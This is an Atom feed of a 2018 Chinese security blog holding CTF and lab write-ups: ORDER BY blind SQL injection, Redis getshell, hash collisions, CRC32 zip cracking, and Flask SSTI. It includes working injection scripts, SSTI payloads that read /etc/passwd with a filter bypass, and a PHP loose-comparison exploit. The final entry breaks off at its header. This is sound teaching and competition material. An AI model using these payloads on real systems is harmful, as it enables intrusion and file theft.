<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Grim&#39;s blog</title>
  
  <subtitle>人生有梦，各自精彩</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-09-07T07:31:55.739Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Mr1.Grim</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SQL注入之order by盲注</title>
    <link href="http://yoursite.com/2018/09/07/order%20by%20%E7%9B%B2%E6%B3%A8/"/>
    <id>http://yoursite.com/2018/09/07/order by 盲注/</id>
    <published>2018-09-06T16:00:00.000Z</published>
    <updated>2018-09-07T07:31:55.739Z</updated>
    
    <content type="html"><![CDATA[<p>一个朋友的博客<br><br><a href="https://yang1k.github.io/2018/02/26/sql%E6%B3%A8%E5%85%A5%E4%B9%8Border%20by%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">https://yang1k.github.io/2018/02/26/sql%E6%B3%A8%E5%85%A5%E4%B9%8Border%20by%E6%B3%A8%E5%85%A5/</a></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><a href="https://p0sec.net/index.php/archives/106/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/106/</a></p><p><img src="http://p1vrkwaxt.bkt.clouddn.com/I2QHBM%29LN%25AGY~X%28E%5D4FHI7.png" alt="image"></p><p>后台代码大概如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$sql = &apos;select * from admin where username=&apos;&quot;.$username.&quot;&apos;&apos;;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">if(isset($row)&amp;&amp;row[&apos;username&apos;]!=&quot;admin&quot;)&#123;</span><br><span class="line">$hit=&quot;username error!&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">if ($row[&apos;password&apos;] === $password)&#123;</span><br><span class="line">$hit=&quot;&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$hit=&quot;password error!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">             </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; union 1,2,&apos;字符串&apos; order by 3</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where username=&apos;admin&apos; or 1 union select 1,2,binary &apos;字符串&apos; order by 3;</span><br></pre></td></tr></table></figure><p>binary是考虑到大小写的问题,因为order by比较的时候不区分大小写。</p><p>exp:(一个例子仅供参考)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">payload = &apos;0123456789abcdefghijklmnopqrstuvwxyz&apos;</span><br><span class="line"></span><br><span class="line">url = &apos;http://115.159.205.137:8001/&apos;</span><br><span class="line">test1 = &apos;&apos;</span><br><span class="line">for a in range(1,50):</span><br><span class="line">for test2 in payload:</span><br><span class="line">data =&#123;&apos;username&apos;:&quot;admin\&apos; or 1 union select 1,2,\&apos;%s%s\&apos; order by 3#&quot;%(test1,test2),&apos;password&apos;:&apos;sd&apos;&#125;</span><br><span class="line">r = requests.post(url,data=data)</span><br><span class="line">if &apos;admin&apos; in r.text:</span><br><span class="line">if &apos;a&apos; in test2:</span><br><span class="line">test1 += &apos;9&apos;</span><br><span class="line">test1 += chr(ord(test2)-1)</span><br><span class="line">print (test1)</span><br><span class="line">break</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一个朋友的博客&lt;br&gt;&lt;br&gt;&lt;a href=&quot;https://yang1k.github.io/2018/02/26/sql%E6%B3%A8%E5%85%A5%E4%B9%8Border%20by%E6%B3%A8%E5%85%A5/&quot; target=&quot;_blank&quot; 
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>2018暑假校内赛SJUCTF</title>
    <link href="http://yoursite.com/2018/08/06/SJUCTF/"/>
    <id>http://yoursite.com/2018/08/06/SJUCTF/</id>
    <published>2018-08-05T16:00:00.000Z</published>
    <updated>2018-08-08T02:26:10.717Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Warm-up"><a href="#Warm-up" class="headerlink" title="Warm up"></a>Warm up</h2><p>js解密-&gt;md5解密</p><p><img src="http://p1vrkwaxt.bkt.clouddn.com/11111.png" alt="image"></p><h2 id="babyweb"><a href="#babyweb" class="headerlink" title="babyweb"></a>babyweb</h2><p>根据hint提醒user/user登陆，发现只有visitor才能得falg</p><p>抓包修改session的user为visitor得到flag</p><p><img src="http://p1vrkwaxt.bkt.clouddn.com/22222.png" alt="image"></p><h2 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h2><p>回车符%0a绕过(抓包内修改)</p><h2 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h2><p>redis getshell</p><p>首先找到web根目录</p><p><img src="http://p1vrkwaxt.bkt.clouddn.com/redis1.png" alt="image"></p><p>telnet过去写shell</p><p>telnet 192.168.19.211 6379</p><p><img src="http://p1vrkwaxt.bkt.clouddn.com/redis2.png" alt="image"></p><p><img src="http://p1vrkwaxt.bkt.clouddn.com/redis3.png" alt="image"></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="MD5-is-dead"><a href="#MD5-is-dead" class="headerlink" title="MD5 is dead"></a>MD5 is dead</h2><p><img src="http://p1vrkwaxt.bkt.clouddn.com/md5%281%29.png" alt="image"></p><p>题目要求md5相同sha1不同的两个文件,同时要求大小在2017kib~2018kib范围</p><p>首先生成一个符合大小的文件(python)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#with open(&apos;test&apos;,&apos;w+&apos;) as f:</span><br><span class="line"># f.write(&apos;1&apos;*2017*1024)</span><br></pre></td></tr></table></figure><p>然后用fastcoll工具碰撞md5生成两个文件上传得到flag</p><h2 id="SHA-1-is-dead-too"><a href="#SHA-1-is-dead-too" class="headerlink" title="SHA-1 is dead too"></a>SHA-1 is dead too</h2><p><img src="http://p1vrkwaxt.bkt.clouddn.com/sha1%281%29.png" alt="image"></p><p>题目要求sha1相同但sha256不同的两个文件,同时要求大小在2018kib~2019kib范围</p><p><a href="https://ctf-wiki.github.io/ctf-wiki/crypto/hash/sha1/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/crypto/hash/sha1/</a></p><p>在谷歌之前公布文档下载好两个pdf，修改一下题目要求大小的脚本,运行后得到两个文件上传得flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from hashlib import sha1</span><br><span class="line">from hashlib import sha256</span><br><span class="line"></span><br><span class="line">pdf1 = open(&apos;./shattered-1.pdf&apos;).read(320)</span><br><span class="line">pdf2 = open(&apos;./shattered-2.pdf&apos;).read(320)</span><br><span class="line">pdf1 = pdf1.ljust(2019 * 1024 + 1 - 320, &quot;\00&quot;)  #padding pdf to 2017Kib + 1</span><br><span class="line">pdf2 = pdf2.ljust(2019 * 1024 + 1 - 320, &quot;\00&quot;)</span><br><span class="line">open(&quot;upload1&quot;, &quot;w&quot;).write(pdf1)</span><br><span class="line">open(&quot;upload2&quot;, &quot;w&quot;).write(pdf2)</span><br><span class="line"></span><br><span class="line">print sha1(pdf1).hexdigest()</span><br><span class="line">print sha1(pdf2).hexdigest()</span><br><span class="line">print sha256(pdf1).hexdigest()</span><br><span class="line">print sha256(pdf2).hexdigest()</span><br></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="CLANNAD"><a href="#CLANNAD" class="headerlink" title="CLANNAD"></a>CLANNAD</h2><p>下载后是wav音频文件 (MP3 Stego工具)</p><p><img src="http://p1vrkwaxt.bkt.clouddn.com/mp3.png" alt="image"></p><p><img src="http://p1vrkwaxt.bkt.clouddn.com/mp3%281%29.png" alt="image"></p><h2 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h2><p>用BlindWaterMark工具盲水印</p><p><a href="https://github.com/chishaxie/BlindWaterMark" target="_blank" rel="noopener">https://github.com/chishaxie/BlindWaterMark</a></p><p><img src="http://p1vrkwaxt.bkt.clouddn.com/mang1.png" alt="image"></p><p><img src="http://p1vrkwaxt.bkt.clouddn.com/Q2%60I4XARE8%28KG8N60VQ%7DZ_V.png" alt="image"></p><h2 id="ZipCRC32"><a href="#ZipCRC32" class="headerlink" title="ZipCRC32"></a>ZipCRC32</h2><p>CRC32攻击脚本:得到一串base64码，解码Pk可知是zip文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line"></span><br><span class="line">import zipfile</span><br><span class="line"></span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">def CrackCrc(crc):</span><br><span class="line"></span><br><span class="line">    for i in dic:</span><br><span class="line"></span><br><span class="line">        for j in dic:</span><br><span class="line"></span><br><span class="line">            for p in dic:</span><br><span class="line"></span><br><span class="line">                for q in dic:</span><br><span class="line"></span><br><span class="line">                    s = i + j + p + q</span><br><span class="line"></span><br><span class="line">                    if crc == (binascii.crc32(s) &amp; 0xffffffff):</span><br><span class="line"></span><br><span class="line">                        print s</span><br><span class="line"></span><br><span class="line">                        f.write(s)</span><br><span class="line"></span><br><span class="line">                        return</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">def CrackZip():</span><br><span class="line"></span><br><span class="line">    for I in range(54):</span><br><span class="line"></span><br><span class="line">        file = &apos;chunk&apos; + str(I) + &apos;.zip&apos;</span><br><span class="line"></span><br><span class="line">        f = zipfile.ZipFile(file, &apos;r&apos;)</span><br><span class="line"></span><br><span class="line">        GetCrc = f.getinfo(&apos;data.txt&apos;)</span><br><span class="line"></span><br><span class="line">        crc = GetCrc.CRC</span><br><span class="line"></span><br><span class="line">        #以上3行为获取压缩包CRC32值的步骤</span><br><span class="line"></span><br><span class="line">        print hex(crc)</span><br><span class="line"></span><br><span class="line">        CrackCrc(crc)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">dic = string.ascii_letters + string.digits + &apos;+/=&apos;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">f = open(&apos;data.txt&apos;, &apos;w&apos;)</span><br><span class="line"></span><br><span class="line">CrackZip()</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>上脚本，将字符串转为zip文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">fin=open(&quot;1.txt&quot;,&quot;r&quot;)</span><br><span class="line">fout=open(&apos;2.zip&apos;,&quot;wb&quot;)</span><br><span class="line">base64.decode(fin,fout)</span><br><span class="line">fin.close()</span><br><span class="line">fout.close()</span><br></pre></td></tr></table></figure></p><p>上工具Ziperello爆破密码得到flag</p><h2 id="Easy-Forensics"><a href="#Easy-Forensics" class="headerlink" title="Easy Forensics"></a>Easy Forensics</h2><p>过滤http流 导出HTTP upload文件 save</p><p><img src="http://p1vrkwaxt.bkt.clouddn.com/http1.png" alt="image"></p><p>保存为zip文件,图片一半flag，属性另一半</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h1&gt;&lt;h2 id=&quot;Warm-up&quot;&gt;&lt;a href=&quot;#Warm-up&quot; class=&quot;headerli
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2018/07/18/SSTI/"/>
    <id>http://yoursite.com/2018/07/18/SSTI/</id>
    <published>2018-07-18T07:18:33.194Z</published>
    <updated>2018-08-08T02:43:45.253Z</updated>
    
    <content type="html"><![CDATA[<hr><p>title: 服务端模板注入(SSTI)复现</p><h2 id="date-2018-7-18"><a href="#date-2018-7-18" class="headerlink" title="date: 2018-7-18"></a>date: 2018-7-18</h2><p>参考链接:<br><br><a href="https://www.cnblogs.com/tyomcat/p/5440488.html" target="_blank" rel="noopener">https://www.cnblogs.com/tyomcat/p/5440488.html</a><br><br><a href="https://www.jianshu.com/p/367ea79c5482" target="_blank" rel="noopener">https://www.jianshu.com/p/367ea79c5482</a><br><a id="more"></a></p><h2 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h2><p>该环境是基于python Flask框架搭建起来的</p><p>github上下载一个docker </p><p><a href="https://github.com/vulhub/vulhub/tree/master/flask/ssti" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/flask/ssti</a></p><p>具体执行命令里面有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 拉取项目</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">cd vulhub</span><br><span class="line"></span><br><span class="line"># 进入某一个漏洞/环境的目录</span><br><span class="line">cd flask/ssti</span><br><span class="line"></span><br><span class="line"># 自动化编译环境</span><br><span class="line">docker-compose build</span><br><span class="line"></span><br><span class="line"># 启动整个环境</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p><h2 id="0x02-原理介绍"><a href="#0x02-原理介绍" class="headerlink" title="0x02 原理介绍"></a>0x02 原理介绍</h2><p>SSTI (Server side template injection) 服务端模板注入</p><p>先来看一下主要代码:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request</span><br><span class="line">from jinja2 import Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/&quot;)</span><br><span class="line">def index():</span><br><span class="line">    name = request.args.get(&apos;name&apos;, &apos;guest&apos;)</span><br><span class="line"></span><br><span class="line">    t = Template(&quot;Hello &quot; + name)</span><br><span class="line">    return t.render()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br></pre></td></tr></table></figure></p><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>name是可输入变量,template()相当于waf，对模板的过滤转义等等,所以一般xss注入是行不通的，(这里代码没太多过滤，xss是可行的，这里讲模板注入)</p><p>下面在本地进行测试几个例子<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.102:8000/?name=1*3</span><br></pre></td></tr></table></figure></p><p><img src="http://p1vrkwaxt.bkt.clouddn.com/J~S$XN4V0Y%7B0%7BIZ814R~Q39.png" alt="image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.102:8000/?name=&#123;&#123;1*3&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="http://p1vrkwaxt.bkt.clouddn.com/Z%7DXKPP26%7B%5D8%28GV90O1FY%28FC.png" alt="image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.102:8000/?name=&#123;&#123;&apos;abc&apos;.upper()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="http://p1vrkwaxt.bkt.clouddn.com/DF%28SJ%28OVEA%7B_8PW1%5DGAV%5BOG.png" alt="image"></p><p>由此可以分析到里面代码会执行，任意命令执行的方法就出来了,这就是原理.</p><h2 id="0x03-模板注入-进阶"><a href="#0x03-模板注入-进阶" class="headerlink" title="0x03 模板注入(进阶)"></a>0x03 模板注入(进阶)</h2><p>如果开发者使用字符串格式化，来将用户输入动态地加入到模板字符串中，而不是通过render_template_string函数将URL传递进入模板内容当中,那么xss就失效了，只能用</p><h3 id="注入姿势"><a href="#注入姿势" class="headerlink" title="注入姿势"></a>注入姿势</h3><ul><li><p>内省request对象。request对象是一个Flask模板全局变量，代表“当前请求对象（flask.request）”。当你在视图中访问request对象时，它包含了你预期想看到的所有信息。</p></li><li><p>内省config对象，config对象是一个Flask模板全局变量，代表“当前配置对象（flask.config）”。</p></li><li><p>使用非常重要的内省组件： <strong>mro</strong>和<strong>subclasses</strong>属性。使用<strong>mro</strong>属性来访问对象的父类，使用<strong>subclasses</strong>属性来访问对象的子类。</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;.\__class__.\__mro__ &#125;&#125; 作为payload注入到SSTI漏洞点当中，</span><br></pre></td></tr></table></figure><p>使用索引1来选择object类。现在我们到达了object类，我们使用<strong>subclasses</strong>属性来dump应用程序中使用的所有类（找到file类的索引）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;.\__class__.\__mro__[1].\__subclasses__() &#125;&#125; 注入到SSTI漏洞点当中</span><br></pre></td></tr></table></figure><p><img src="http://p1vrkwaxt.bkt.clouddn.com/0~652%7BPZW@3O~V%25RBZ%25~IX1.png" alt="image">　　</p><ul><li>任意文件读取POC</li></ul><p>file类能够实例化文件对象，而且如果我们实例化了一个文件对象，那么我们就可用使用类似于read的方法来读取相关内容。</p><p>　　　　　找到file类的索引，在我的环境中<type 'file'="">类的索引是40，我们就注入</type></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/etc/passwd&apos;).read() &#125;&#125;。</span><br></pre></td></tr></table></figure><p>具体参考我上面的链接</p><h2 id="0x04-赛题分析"><a href="#0x04-赛题分析" class="headerlink" title="0x04 赛题分析"></a>0x04 赛题分析</h2><p>因为题目的关闭，这里只能给个大概的分析</p><p>确认是SSTI漏洞，但这儿把魔术方法给拦截了,所以这个下面payload不可行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()\[40](&apos;/etc/passwd&apos;).read() &#125;&#125;</span><br></pre></td></tr></table></figure><p>但也并不是毫无办法,可以写为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;[request.cookies.a][request.cookies.b][2][request.cookies.c]()[40](&apos;/etc/passwd&apos;)[request.cookies.d]()&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">并传入四个cookiea=\__class__; b=\__mro__; c=\__subclasses__; d=read</span><br></pre></td></tr></table></figure><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>一个很不错的姿势呢</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
&lt;p&gt;title: 服务端模板注入(SSTI)复现&lt;/p&gt;
&lt;h2 id=&quot;date-2018-7-18&quot;&gt;&lt;a href=&quot;#date-2018-7-18&quot; class=&quot;headerlink&quot; title=&quot;date: 2018-7-18&quot;&gt;&lt;/a&gt;date: 2018-7-18&lt;/h2&gt;&lt;p&gt;参考链接:&lt;br&gt;&lt;br&gt;&lt;a href=&quot;https://www.cnblogs.com/tyomcat/p/5440488.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.cnblogs.com/tyomcat/p/5440488.html&lt;/a&gt;&lt;br&gt;&lt;br&gt;&lt;a href=&quot;https://www.jianshu.com/p/367ea79c5482&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.jianshu.com/p/367ea79c5482&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>QCTF2018-XMan选拔赛</title>
    <link href="http://yoursite.com/2018/07/15/2018XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5/"/>
    <id>http://yoursite.com/2018/07/15/2018XMAN夏令营/</id>
    <published>2018-07-14T16:00:00.000Z</published>
    <updated>2018-07-18T07:18:29.819Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2018XMAN选拔赛-WEB"><a href="#2018XMAN选拔赛-WEB" class="headerlink" title="2018XMAN选拔赛-WEB"></a>2018XMAN选拔赛-WEB</h2><h3 id="0x01-Lottery"><a href="#0x01-Lottery" class="headerlink" title="0x01 Lottery"></a>0x01 Lottery</h3><a id="more"></a><p><img src="http://p1vrkwaxt.bkt.clouddn.com/KJTXOBRFO%5BV%28%256CYC~KJIF6.png" alt="image"></p><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>这题总地来讲，通过猜数字游戏来赢得奖金，最后需要一大笔奖金来买flag，但赢得的奖金可能率特别低几乎不可能</p><h4 id="做题步骤"><a href="#做题步骤" class="headerlink" title="做题步骤"></a>做题步骤</h4><ul><li>首先在robots.txt文件提示git源码泄露</li><li>用GitHack工具来恢复源码，工具地址和说明如右<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">GitHack</a></li><li>下载并恢复源码后，在api.php文件中有一段源码如下</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function buy($req)&#123;</span><br><span class="line">require_registered();</span><br><span class="line">require_min_money(2);</span><br><span class="line"></span><br><span class="line">$money = $_SESSION[&apos;money&apos;];</span><br><span class="line">$numbers = $req[&apos;numbers&apos;];</span><br><span class="line">$win_numbers = random_win_nums();</span><br><span class="line">$same_count = 0;</span><br><span class="line">for($i=0; $i&lt;7; $i++)&#123;</span><br><span class="line">if($numbers[$i] == $win_numbers[$i])&#123;</span><br><span class="line">$same_count++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>分析源码,可以看到有一个==比较，且对输入参数无任何限制，接下来看一段php测试代码(php交互模式下)<br><img src="http://p1vrkwaxt.bkt.clouddn.com/L%7DEX963XTU~%28VSU5~SKSJ%298.png" alt="image"></li></ul><p>可以看到不管数字多少，只要==true，它这个return返回的都是1，也就是视为正确的意思，所以我们可以抓包构造json数组，也可以构造exp</p><p><img src="http://p1vrkwaxt.bkt.clouddn.com/%5DMWFQH%299P%250LAIPIUPR32VG.png" alt="image"></p><p>exp:(别人博客搜来的,已测试，能用)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from requests import Session</span><br><span class="line">from time import time</span><br><span class="line">from json import dumps</span><br><span class="line"></span><br><span class="line">u = Session()</span><br><span class="line"></span><br><span class="line">u.headers[&apos;Content-Type&apos;] = &apos;application/json&apos;</span><br><span class="line"></span><br><span class="line">def register():</span><br><span class="line">    return u.post(&apos;http://47.96.118.255:8888/api.php&apos;, data=dumps(&#123;&apos;action&apos; : &apos;register&apos;, &apos;name&apos; : time() &#125;))</span><br><span class="line"></span><br><span class="line">def buy(what):</span><br><span class="line">    return u.post(&apos;http://47.96.118.255:8888/api.php&apos;, data=dumps(&#123;&apos;action&apos; : &apos;buy&apos; , &apos;numbers&apos; : what&#125;))</span><br><span class="line"></span><br><span class="line">def flag():</span><br><span class="line">    return u.post(&apos;http://47.96.118.255:8888/api.php&apos;, data=dumps(&#123;&apos;action&apos; : &apos;flag&apos;&#125;)).text</span><br><span class="line"></span><br><span class="line">exp = [True, True, True, True, True, True, True]</span><br><span class="line">register()</span><br><span class="line">buy(exp)</span><br><span class="line">buy(exp)</span><br><span class="line">buy(exp)</span><br><span class="line">print(flag())</span><br></pre></td></tr></table></figure></p><h3 id="0x02-Confusion1"><a href="#0x02-Confusion1" class="headerlink" title="0x02 Confusion1"></a>0x02 Confusion1</h3><p>题目关闭了，无奈，这里已经复现了一下原理，可以去我博客看看，这里利用的是SSTI原理,附上几个链接</p><p><a href="https://www.jianshu.com/p/55c5477567fe" target="_blank" rel="noopener">https://www.jianshu.com/p/55c5477567fe</a></p><p><a href="https://www.jianshu.com/p/cd430094d561" target="_blank" rel="noopener">https://www.jianshu.com/p/cd430094d561</a></p><p>官方网址 <a href="https://www.xctf.org.cn/library/details/8723e039db0164e2f7345a12d2edd2a5e800adf7/" target="_blank" rel="noopener">https://www.xctf.org.cn/library/details/8723e039db0164e2f7345a12d2edd2a5e800adf7/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;2018XMAN选拔赛-WEB&quot;&gt;&lt;a href=&quot;#2018XMAN选拔赛-WEB&quot; class=&quot;headerlink&quot; title=&quot;2018XMAN选拔赛-WEB&quot;&gt;&lt;/a&gt;2018XMAN选拔赛-WEB&lt;/h2&gt;&lt;h3 id=&quot;0x01-Lottery&quot;&gt;&lt;a href=&quot;#0x01-Lottery&quot; class=&quot;headerlink&quot; title=&quot;0x01 Lottery&quot;&gt;&lt;/a&gt;0x01 Lottery&lt;/h3&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MD5哈希(hash)长度扩展攻击</title>
    <link href="http://yoursite.com/2018/07/10/md5%E5%93%88%E5%B8%8C%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/"/>
    <id>http://yoursite.com/2018/07/10/md5哈希扩展攻击/</id>
